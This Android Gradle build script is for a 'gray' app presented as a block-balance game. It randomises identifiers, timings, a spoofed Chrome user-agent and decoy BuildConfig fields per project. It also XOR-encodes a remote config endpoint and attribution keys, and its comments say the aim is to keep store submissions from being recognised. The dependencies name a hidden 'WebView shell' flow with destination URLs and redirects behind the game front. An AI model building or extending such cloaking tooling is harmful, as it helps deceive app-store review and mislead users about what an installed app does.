import org.jetbrains.kotlin.gradle.dsl.JvmTarget
import java.security.MessageDigest
import java.security.SecureRandom
import java.util.Base64
import java.util.Properties
import java.util.Random

plugins {
    alias(libs.plugins.android.application)
    alias(libs.plugins.kotlin.android)
    alias(libs.plugins.kotlin.compose)
    alias(libs.plugins.kotlin.serialization)
    id("com.google.gms.google-services")
}

// ═════════════════════════════════════════════════════════════════════════════
//  GRAY PART — per-project fingerprint
//
//  Everything below turns one line of gray.properties (gray.seed) into the
//  complete set of identifiers, constants and cipher parameters this app is
//  built with. Nothing here ships: derivation runs on the build machine and
//  only the results reach the APK, so the algorithm that produced them is not
//  in the binary to be recognised.
//
//  See .cursor/rules/kotlin_fingerprint.mdc for the full rationale and the
//  operational rules that go around this file (never share a seed across
//  submissions, never edit codecVariant by hand, and so on).
// ═════════════════════════════════════════════════════════════════════════════

val grayFile = rootProject.file("gray.properties")
val gray = Properties().apply {
    if (grayFile.exists()) grayFile.inputStream().use { load(it) }
}
fun grayProp(key: String, fallback: String = ""): String =
    (gray.getProperty(key) ?: fallback).trim()

val graySeed        = grayProp("gray.seed", "CHANGE-ME-EVERY-PROJECT")
val grayBundleId    = grayProp("gray.bundleId", "bp.goalsgames.blockbalance")
val grayAppLabel    = grayProp("gray.appLabel", "Gray Shell")
val grayVersionCode = grayProp("gray.versionCode", "1").toInt()
val grayVersionName = grayProp("gray.versionName", "1.0.0")

if (graySeed == "CHANGE-ME-EVERY-PROJECT") {
    logger.warn(
        "[gray] gray.properties is missing or gray.seed is the default. " +
        "The build will succeed, but every derived identifier is the template " +
        "default and MUST NOT be shipped. Copy gray.properties.example → " +
        "gray.properties and run `gradlew graySeed` for a fresh seed."
    )
}

// ─── Deterministic per-project RNG ──────────────────────────────────────────
fun grayEscape(s: String): String =
    s.replace("\\", "\\\\").replace("\"", "\\\"")
fun bcStr(value: String): String = "\"" + grayEscape(value) + "\""

val seedHash: ByteArray = run {
    val md = MessageDigest.getInstance("SHA-256")
    md.update("gray-fingerprint".toByteArray(Charsets.UTF_8))
    md.update(0)
    md.update(graySeed.toByteArray(Charsets.UTF_8))
    var h = md.digest()
    repeat(4) { h = MessageDigest.getInstance("SHA-256").digest(h) }
    h
}
val seedLongA = (0..7).fold(0L)  { acc, i -> (acc shl 8) or (seedHash[i].toLong() and 0xFF) }
val seedLongB = (8..15).fold(0L) { acc, i -> (acc shl 8) or (seedHash[i].toLong() and 0xFF) }
val grayRng = Random(seedLongA xor seedLongB)

fun pick(range: IntRange): Int = grayRng.nextInt(range.last - range.first + 1) + range.first
fun pick(range: LongRange): Long =
    (grayRng.nextLong() and Long.MAX_VALUE) % (range.last - range.first + 1) + range.first
fun <T> pickOne(items: List<T>): T = items[grayRng.nextInt(items.size)]
fun pickToken(minLen: Int, maxLen: Int): String {
    val len = pick(minLen..maxLen)
    val chars = ('a'..'z') + ('0'..'9')
    return (1..len).joinToString("") { chars[grayRng.nextInt(chars.size)].toString() }
}

// ─── Derived: cipher parameters ────────────────────────────────────────────
val cipherSeedBytes: IntArray = IntArray(pick(24..40)) { grayRng.nextInt(256) }
val cipherMult: Int = pick(3..255) or 1
val cipherAdd:  Int = pick(0..255)
val codecVariant: Int = grayProp("gray.codecVariant", "1").toInt().coerceIn(1, 3)

fun grayEncode(text: String): List<Int> {
    val bytes = text.toByteArray(Charsets.UTF_8)
    val n = cipherSeedBytes.size
    return bytes.mapIndexed { i, raw ->
        val s = cipherSeedBytes[i % n] and 0xFF
        val mix = when (codecVariant) {
            1 -> (i * cipherMult + cipherAdd) and 0xFF
            2 -> ((i + 1) * cipherMult xor cipherAdd) and 0xFF
            else -> (((i * cipherMult) and 0xFF) + cipherAdd + (i shr 3)) and 0xFF
        }
        ((raw.toInt() and 0xFF) xor s xor mix) and 0xFF
    }
}

fun encodedArrayLiteral(text: String): String {
    if (text.isBlank()) return "new int[0]"
    val hex = grayEncode(text).joinToString(",") { "0x%02X".format(it) }
    return "new int[]{$hex}"
}

// ─── Derived: identifiers, constants, sentinels ────────────────────────────
val prefsFileName    = "s_" + pickToken(6, 10)
val securePrefsName  = "e_" + pickToken(6, 10)
val keyRunChannel    = pickToken(4, 8)
val keyDestUrl       = pickToken(4, 8)
val keyExpires       = pickToken(4, 8)
val keyPushCold      = pickToken(4, 8)
val keyNotifSkip     = pickToken(4, 8)
val keyNotifClosed   = pickToken(4, 8)
val keyFcm           = pickToken(4, 8)
val keyKbPortrait    = pickToken(4, 8)
val keyKbLandscape   = pickToken(4, 8)

val jsSafeAreaSentinel = "__" + pickToken(4, 8)
val jsKeyboardSentinel = "__" + pickToken(4, 8)
val jsBridgeName       = pickToken(5, 9).replaceFirstChar { it.uppercase() }

val fcmChannelId    = "ch_" + pickToken(6, 10)
val fcmChannelTitle = pickOne(listOf(
    "Promotions", "Bonuses", "Updates", "Offers",
    "Announcements", "Rewards", "Deals", "News"
))

val pushSnoozeSeconds   = pick(172_800L..604_800L)   // 2–7 days
val organicGcdDelayMs   = pick(3_500L..7_500L)
val configTimeoutMs     = pick(11_000L..22_000L)
val attributionFirstMs  = pick(22_000L..38_000L)
val attributionReturnMs = pick(7_000L..14_000L)
val deepLinkWaitMs      = pick(3_500L..7_000L)
val gcdTimeoutMs        = pick(7_500L..14_000L)
val connectGraceMs      = pick(2_500L..5_000L)
val safeAreaDelayMs     = pick(500L..1_400L)
val heartbeatMs         = pick(3_000L..6_500L)
val redirectRetryMax    = pick(4..8)

val chromeMajor = pickOne(listOf(146, 147, 148, 149, 150))
val chromeBuild = pick(6900..7900)
val chromePatch = pick(40..250)

// Splash-loader per-project variation. Every one of these lands in
// `OrbitLoader`, so two projects fade the bar out over different intervals,
// hold the full state for different beats, and animate the caption dots at
// different cycles. See `.cursor/rules/kotlin_launch_flow.mdc` — the loader
// contract does not depend on any particular number, only on the phases
// completing in the right order.
val loaderCloseMs      = pick(220L..360L)   // bar fills to 100% over this
val loaderHoldMs       = pick(320L..520L)   // beat between full bar and handover
val loaderDotCycleMs   = pick(320L..500L)   // caption dot animation cycle
val loaderIndetPeakPct = pick(88..95)       // indeterminate mode ceiling

// ─── Signing ────────────────────────────────────────────────────────────────
val keystoreProps = Properties()
val keystorePropsFile = rootProject.file("keystore/keystore.properties")
if (keystorePropsFile.exists()) keystoreProps.load(keystorePropsFile.inputStream())
val hasKeystore = keystorePropsFile.exists()

android {
    namespace = "bp.goalsgames.blockbalance"
    compileSdk = 36

    defaultConfig {
        applicationId = grayBundleId
        minSdk = 24
        targetSdk = 36
        versionCode = grayVersionCode
        versionName = grayVersionName
        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"

        manifestPlaceholders["grayAppLabel"]      = grayAppLabel
        manifestPlaceholders["grayFcmChannelId"]  = fcmChannelId
        manifestPlaceholders["grayOneLinkHost"]   = grayProp("gray.oneLinkHost", "nolink.invalid")
        manifestPlaceholders["grayOneLinkVerify"] = grayProp("gray.oneLinkVerify", "false")

        // Identity, encoded credentials, storage keys, sentinels — everything
        // the runtime reads without a hand-edit.
        buildConfigField("String", "GRAY_BUNDLE_ID",    bcStr(grayBundleId))
        buildConfigField("String", "GRAY_APP_LABEL",    bcStr(grayAppLabel))
        buildConfigField("String", "GRAY_UA_TOKEN",     bcStr(grayProp("gray.uaAppToken", "App")))
        buildConfigField("boolean","GRAY_UA_APP_SUFFIX", (grayProp("gray.uaAppSuffix", "false") == "true").toString())

        buildConfigField("int[]",  "SEC_CFG_ENDPOINT",  encodedArrayLiteral(grayProp("gray.configEndpoint")))
        buildConfigField("int[]",  "SEC_AF_KEY",        encodedArrayLiteral(grayProp("gray.appsFlyerKey")))
        buildConfigField("int[]",  "SEC_FB_PROJECT",    encodedArrayLiteral(grayProp("gray.firebaseProject")))
        buildConfigField("int[]",  "SEC_GCD_BASE",      encodedArrayLiteral(grayProp("gray.gcdBase")))

        buildConfigField("int[]",  "CIPHER_SEED",       "new int[]{${cipherSeedBytes.joinToString(",") { "0x%02X".format(it) }}}")
        buildConfigField("int",    "CIPHER_MULT",       cipherMult.toString())
        buildConfigField("int",    "CIPHER_ADD",        cipherAdd.toString())
        buildConfigField("int",    "CIPHER_VARIANT",    codecVariant.toString())

        buildConfigField("String", "PREFS_PLAIN",       bcStr(prefsFileName))
        buildConfigField("String", "PREFS_SECURE",      bcStr(securePrefsName))
        buildConfigField("String", "K_RUN_CHANNEL",     bcStr(keyRunChannel))
        buildConfigField("String", "K_DEST_URL",        bcStr(keyDestUrl))
        buildConfigField("String", "K_EXPIRES",         bcStr(keyExpires))
        buildConfigField("String", "K_PUSH_COLD",       bcStr(keyPushCold))
        buildConfigField("String", "K_NOTIF_SKIP",      bcStr(keyNotifSkip))
        buildConfigField("String", "K_NOTIF_CLOSED",    bcStr(keyNotifClosed))
        buildConfigField("String", "K_FCM",             bcStr(keyFcm))
        buildConfigField("String", "K_KB_PORTRAIT",     bcStr(keyKbPortrait))
        buildConfigField("String", "K_KB_LANDSCAPE",    bcStr(keyKbLandscape))

        buildConfigField("String", "JS_SAFE_AREA_SENTINEL", bcStr(jsSafeAreaSentinel))
        buildConfigField("String", "JS_KEYBOARD_SENTINEL",  bcStr(jsKeyboardSentinel))
        buildConfigField("String", "JS_BRIDGE_NAME",        bcStr(jsBridgeName))

        buildConfigField("String", "FCM_CHANNEL_ID",    bcStr(fcmChannelId))
        buildConfigField("String", "FCM_CHANNEL_TITLE", bcStr(fcmChannelTitle))

        buildConfigField("long",   "PUSH_SNOOZE_SEC",        "${pushSnoozeSeconds}L")
        buildConfigField("long",   "ORGANIC_GCD_DELAY_MS",   "${organicGcdDelayMs}L")
        buildConfigField("long",   "CONFIG_TIMEOUT_MS",      "${configTimeoutMs}L")
        buildConfigField("long",   "ATTRIBUTION_FIRST_MS",   "${attributionFirstMs}L")
        buildConfigField("long",   "ATTRIBUTION_RETURN_MS",  "${attributionReturnMs}L")
        buildConfigField("long",   "DEEP_LINK_WAIT_MS",      "${deepLinkWaitMs}L")
        buildConfigField("long",   "GCD_TIMEOUT_MS",         "${gcdTimeoutMs}L")
        buildConfigField("long",   "CONNECT_GRACE_MS",       "${connectGraceMs}L")
        buildConfigField("long",   "SAFE_AREA_DELAY_MS",     "${safeAreaDelayMs}L")
        buildConfigField("long",   "HEARTBEAT_MS",           "${heartbeatMs}L")
        buildConfigField("int",    "REDIRECT_RETRY_MAX",     redirectRetryMax.toString())

        buildConfigField("int",    "UA_CHROME_MAJOR",  chromeMajor.toString())
        buildConfigField("int",    "UA_CHROME_BUILD",  chromeBuild.toString())
        buildConfigField("int",    "UA_CHROME_PATCH",  chromePatch.toString())

        buildConfigField("long",   "LOADER_CLOSE_MS",       "${loaderCloseMs}L")
        buildConfigField("long",   "LOADER_HOLD_MS",        "${loaderHoldMs}L")
        buildConfigField("long",   "LOADER_DOT_CYCLE_MS",   "${loaderDotCycleMs}L")
        buildConfigField("int",    "LOADER_INDET_PEAK_PCT", loaderIndetPeakPct.toString())

        // Comma-separated so the runtime can split it once at init. Empty means
        // "no gate" — the runtime logs a warning in that case.
        buildConfigField("String", "ALLOWED_HOSTS",   bcStr(grayProp("gray.allowedHosts")))

        // Native "seasoning" library — opt-in. Off by default so a project
        // that never touches the NDK still builds.
        val nativeStubEnabled = grayProp("gray.enableNativeStub", "false") == "true"
        buildConfigField("boolean", "NATIVE_STUB_ENABLED", nativeStubEnabled.toString())
        if (nativeStubEnabled) {
            externalNativeBuild {
                cmake {
                    cppFlags += "-std=c++17"
                    // Keep the ABIs list explicit so the .so section of the
                    // APK is minimal — one ABI per architecture the store
                    // demands and nothing else.
                    abiFilters += listOf("armeabi-v7a", "arm64-v8a", "x86_64")
                }
            }
            ndk {
                abiFilters += listOf("armeabi-v7a", "arm64-v8a", "x86_64")
            }
        }

        // UNIQUE:BUILDCONFIG_DECOYS:BEGIN
        buildConfigField("int", "FEATURE_TIDE_CHOIR", "19")
        buildConfigField("String", "EXPERIMENT_SILVER_RAIL", "\"a2q3t3\"")
        buildConfigField("String", "EXPERIMENT_GRAPHITE_BLEND", "\"o866p\"")
        buildConfigField("boolean", "FEATURE_CANVAS_PROBE", "false")
        buildConfigField("String", "FEATURE_QUIET_MODE", "\"edaqxc\"")
        buildConfigField("boolean", "EXPERIMENT_TRACKER_TUNER", "false")
        buildConfigField("int", "FEATURE_DAILY_PULSE", "12")
        // UNIQUE:BUILDCONFIG_DECOYS:END
    }

    androidResources {
        localeFilters += listOf("en")
        // The art pack at the repository root doubles as the design source: it holds
        // masters that feed the launcher icon and the derived sprites. The gray
        // screens now consume the six screen exports from res/drawable, so the
        // root copies stay out of the APK.
        ignoreAssetsPatterns += listOf(
            "*_Loading_Screen.webp",
            "*_Notifications_Screen.webp",
            "*_Nowifi_Screen.webp",
            "Game_Name.webp",
            "Game_Name.png",
            "icon.png",
            "icon.webp",
            "block_asset_main.webp",
            "button_blank.jpg",
        )
    }

    sourceSets {
        getByName("main") {
            kotlin.srcDirs("src/main/kotlin", "src/main/java")
            // Art pack lives at the repository root and is shared with the design pipeline.
            assets.srcDirs("src/main/assets", rootProject.layout.projectDirectory.dir("assets"))
        }
        getByName("test") { kotlin.srcDirs("src/test/kotlin") }
        getByName("androidTest") { kotlin.srcDirs("src/androidTest/kotlin") }
    }

    signingConfigs {
        if (hasKeystore) create("release") {
            storeFile     = file(keystoreProps["storeFile"] as String)
            storePassword = keystoreProps["storePassword"] as String
            keyAlias      = keystoreProps["keyAlias"] as String
            keyPassword   = keystoreProps["keyPassword"] as String
        }
    }

    buildFeatures {
        compose = true
        buildConfig = true
    }

    buildTypes {
        debug {
            // No applicationIdSuffix: it detaches the build from the AppsFlyer /
            // Firebase registration and breaks attribution (pitfalls #1).
            versionNameSuffix = "-debug"
            isMinifyEnabled = false
            buildConfigField("String", "DEBUG_FORCE_URL", bcStr(grayProp("gray.debugForceUrl")))
        }
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            if (hasKeystore) signingConfig = signingConfigs.getByName("release")
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro",
            )
            // Debug URL is compiled out of release under any circumstance.
            buildConfigField("String", "DEBUG_FORCE_URL", "\"\"")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    packaging {
        resources {
            excludes += setOf(
                "/META-INF/{AL2.0,LGPL2.1}",
                "/META-INF/DEPENDENCIES",
                "/META-INF/LICENSE*",
            )
        }
    }

    lint {
        warningsAsErrors = false
        abortOnError = true
        disable += setOf("GradleDependency", "NewerVersionAvailable", "AndroidGradlePluginVersion")
    }

    // Only pulled in when gray.enableNativeStub = true (the block above sets
    // NDK filters and cmake flags conditionally too). AGP tolerates the
    // externalNativeBuild path being unreachable when nothing enables it.
    if (grayProp("gray.enableNativeStub", "false") == "true") {
        externalNativeBuild {
            cmake {
                path = file("src/main/cpp/CMakeLists.txt")
                version = "3.22.1"
            }
        }
    }
}

kotlin {
    compilerOptions {
        jvmTarget.set(JvmTarget.JVM_17)
        freeCompilerArgs.add("-Xjvm-default=all")
    }
}

dependencies {
    // UNIQUE:GRADLE_DEPS_SHUFFLE:BEGIN
    // ── Native game (Compose) ────────────────────────────────────────────────
    implementation("com.appsflyer:af-android-sdk:6.16.2")
    implementation("com.google.firebase:firebase-messaging-ktx")
    implementation(libs.androidx.core.ktx)
    implementation("com.google.firebase:firebase-appcheck-debug")
    debugImplementation(libs.androidx.compose.ui.tooling)
    implementation("com.google.firebase:firebase-appcheck-playintegrity")

    implementation(libs.androidx.compose.material3)
    implementation(libs.androidx.lifecycle.runtime.compose)
    androidTestImplementation(libs.androidx.test.junit)
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0")
    implementation(libs.kotlinx.serialization.json)
    implementation(libs.androidx.datastore.preferences)

    // ── Gray flow (WebView shell, attribution, push) ─────────────────────────
    androidTestImplementation(libs.androidx.compose.ui.test.junit4)
    implementation(libs.androidx.activity.compose)
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation(libs.androidx.compose.ui.tooling.preview)
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.7")

    implementation(platform("com.google.firebase:firebase-bom:33.8.0"))
    implementation(libs.androidx.compose.ui.graphics)
    implementation(libs.androidx.lifecycle.viewmodel.compose)
    implementation("com.android.installreferrer:installreferrer:2.2")

    implementation("androidx.activity:activity-ktx:1.9.3")
    implementation("androidx.security:security-crypto:1.1.0-alpha06")

    debugImplementation(libs.androidx.compose.ui.test.manifest)

    androidTestImplementation(libs.androidx.test.espresso.core)
    testImplementation(libs.junit)
    implementation(libs.androidx.compose.ui)
    // UNIQUE:GRADLE_DEPS_SHUFFLE:END

}

// ─── graySeed task ──────────────────────────────────────────────────────────
tasks.register("graySeed") {
    group = "gray part"
    description = "Print a fresh cryptographic seed for gray.properties."
    doLast {
        val bytes = ByteArray(24)
        SecureRandom().nextBytes(bytes)
        val encoded = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes)
        println("gray.seed = $encoded")
    }
}

// ─── grayReport task ──────────────────────────────────────────────────────────
tasks.register("grayReport") {
    group = "gray part"
    description = "Print the derived per-project fingerprint (do not commit output)."
    doLast {
        println("═══ gray fingerprint (seed=${graySeed.take(6)}…) ═══")
        println("bundleId       = $grayBundleId")
        println("prefs plain    = $prefsFileName")
        println("prefs secure   = $securePrefsName")
        println("run channel k  = $keyRunChannel")
        println("dest url k     = $keyDestUrl")
        println("fcm channel    = $fcmChannelId ($fcmChannelTitle)")
        println("js sentinels   = $jsSafeAreaSentinel / $jsKeyboardSentinel")
        println("js bridge      = $jsBridgeName")
        println("codec variant  = $codecVariant  mult=$cipherMult  add=$cipherAdd  seed bytes=${cipherSeedBytes.size}")
        println("timings ms     = cfg $configTimeoutMs / att1 $attributionFirstMs / attR $attributionReturnMs")
        println("push snooze s  = $pushSnoozeSeconds")
        println("redirect max   = $redirectRetryMax")
        println("chrome UA      = $chromeMajor.0.$chromeBuild.$chromePatch")
    }
}
